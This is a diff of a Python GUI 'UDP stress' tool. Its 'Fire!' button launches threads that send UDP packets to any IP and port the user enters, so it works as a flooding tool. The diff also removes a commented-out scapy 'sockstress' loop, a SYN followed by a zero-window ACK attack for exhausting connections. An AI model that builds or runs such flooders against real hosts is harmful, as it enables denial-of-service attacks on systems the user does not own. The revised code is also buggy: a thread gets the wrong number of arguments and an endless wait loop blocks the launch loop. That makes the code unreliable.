@@ -1,41 +1,25 @@
 import socket
 import _thread
+
 try:
     import tkinter as tk  # for python 3
 except:
     import Tkinter as tk  # for python 2
 import pygubu
+import time
+from threading import Thread
 
 
-# class UdpStress:
-#     target = '127.0.0.1'
-#     port = 80
-#     threads = 1
-#
-#     def __init__(self, target, port, threads):
-#         self.target = target
-#         self.port = port
-#         self.threads = threads
-
-# def sockstress(self, target = target, port = port,verbose=0):
-#     while True:
-#         try:
-#             x = random.randint(0,65535)
-#             #dst = destination IP string
-#             #sport = source port
-#             #dport = destination port
-#             response = sr1(IP(dst=target)/TCP(sport=x, dport=port,flags='S'),timeout=1,verbose=verbose)
-#             send(IP(dst=target)/TCP(dport=port,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=verbose)
-#         except:
-#             pass
+def wait(Thread, delay):
+    time.sleep(delay)
 
 
 def sendudp(ip_address, port, message):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
-    sock.sendto(bytes(message, "utf-8"), (ip_address, port))
-#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#     sock.bind((ip_address, port))
-#     sock.sendto(message.encode('utf-8'), (ip_address, int(port)))
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
+        sock.sendto(bytes(message, "utf-8"), (ip_address, port))
+    except:
+        print("Error sending UDP")
 
 
 class Application:
@@ -93,28 +77,28 @@ class Application:
         button_ready = self.builder.get_object('button_ready')
 
         if str(button_ready.cget('text')) == 'Fire!':
-            button_ready.configure(text='Stop firing!')
-            ip_address = str((self.builder.get_object('entry_ip_address')).get())
-            port = int((self.builder.get_object('entry_port')).get())
-            message = str((self.builder.get_object('entry_message')).get())
-            label_ready = self.builder.get_object('label_ready')
+            try:
 
-            threads = int((self.builder.get_object('entry_threads')).get())
+                button_ready.configure(text='Stop firing!')
+                ip_address = str((self.builder.get_object('entry_ip_address')).get())
+                port = int((self.builder.get_object('entry_port')).get())
+                message = str((self.builder.get_object('entry_message')).get())
+                label_ready = self.builder.get_object('label_ready')
 
-            requestsCount = 0
+                threads = int((self.builder.get_object('entry_threads')).get())
 
-            for x in range(0, 100):
+                requestsCount = 0
+            except:
+                print("Error setting variables ")
+            for x in range(0, threads):
                 try:
-                    threadnum = _thread.start_new_thread(sendudp, (ip_address, port, message))
-                    print("[",threadnum,"]UDP target IP:", ip_address)
-                    print("[",threadnum,"]UDP target port:", port)
-                    print("[",threadnum,"]message:", message)
-                    # while str(button_ready.cget('text')) == 'Stop firing!':
-                    #     requestsCount += 1
-                    #     label_ready.configure(text=str(requestsCount))
-                    # #   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    # #   sock.bind((ip_address, port))
-                    # #   sock.sendto(message.encode('utf-8'), (ip_address, int(port)))
+
+                        threadId = _thread.start_new_thread(sendudp, (ip_address, port, message, 2))
+                        while True:
+                            wait(threadId, 2)
+                            print("[", threadId, "]UDP target IP:", ip_address)
+                            print("[", threadId, "]UDP target port:", port)
+                            print("[", threadId, "]message:", message)
                 except:
                     print("Error starting thread")
         else:
